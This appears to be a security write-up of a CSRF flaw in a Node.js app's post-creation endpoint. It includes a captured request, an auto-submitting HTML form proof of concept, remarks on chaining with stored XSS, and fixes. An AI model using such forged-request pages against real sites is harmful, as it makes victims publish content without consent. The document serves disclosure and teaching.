# CSRF Vulnerability -- Unauthorized Post Creation

## 📌 Summary

A **Cross-Site Request Forgery (CSRF)** vulnerability was identified in
the post creation functionality of a Node.js web application. This issue
allows an attacker to force an authenticated victim to publish a post
without their consent.

------------------------------------------------------------------------

## 🎯 Impact

-   Unauthorized content creation
-   Reputation damage to affected users
-   Potential abuse for spam or phishing content

**Severity:** Medium\
**OWASP Top 10:** A5 -- Security Misconfiguration / CSRF

------------------------------------------------------------------------

## 🧩 Affected Endpoint

POST /user/posts/create

------------------------------------------------------------------------

## 🔍 Vulnerability Details

The backend endpoint responsible for creating posts does not implement
effective CSRF protections. Specifically: - No CSRF token is validated -
Cookies are automatically included in cross-site requests -
Origin/Referer headers are not strictly validated

As a result, a malicious website can trigger a POST request on behalf of
an authenticated user.

------------------------------------------------------------------------

## 📥 Normal Request (Captured via Burp Suite)

``` http
POST /user/posts/create HTTP/1.1
Host: 172.22.228.255:3000
Content-Type: multipart/form-data
Cookie: token=<JWT_TOKEN>

title=cs
content=cs
```

------------------------------------------------------------------------

## 💥 Exploitation

An attacker can host a malicious HTML page containing an auto-submitting
form. When a logged-in victim visits this page, the browser
automatically sends the authenticated request, resulting in a new post
being created without user interaction.

HTML page:
``` html
<!DOCTYPE html>
<html>
  <body>
    <form method="POST"
          action="http://localhost:3000/user/posts/create"
          enctype="multipart/form-data">

      <input type="hidden" name="title" value="CSRF Post">
      <input type="hidden" name="content" value="This post was created via CSRF">
      <input type="hidden" name="cover" value="">

    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

```

No CSRF token is required for the request to be accepted by the server.

------------------------------------------------------------------------

## 🚨 Proof of Exploitation

### Before Exploitation

No post exists in the user's account.

### After Exploitation

A new post appears under the victim's account without their intentional
action.

------------------------------------------------------------------------

## 🛡️ Root Cause

-   Missing CSRF token validation
-   Insecure cookie configuration
-   Lack of Origin/Referer checks

------------------------------------------------------------------------

## 🔗 Chaining with Other Vulnerabilities

This CSRF vulnerability can be **combined with XSS** to increase impact.
For example: - Stored XSS payloads can be injected via forced post
creation - Automatic CSRF triggers can be embedded inside malicious
JavaScript

Example payloads and attack scenarios are documented in: [Cross-Site Scripting (XSS)](/XSS.md)

------------------------------------------------------------------------

## ✅ Recommended Fix

-   Implement CSRF tokens (e.g., `csurf` middleware)
-   Set cookies with `SameSite=Strict`
-   Validate `Origin` and `Referer` headers
-   Require explicit user interaction for sensitive actions

------------------------------------------------------------------------

## 📚 Learning Outcome

This vulnerability demonstrates how missing CSRF protections in modern
web applications can still lead to impactful attacks, especially when
chained with client-side vulnerabilities such as XSS.
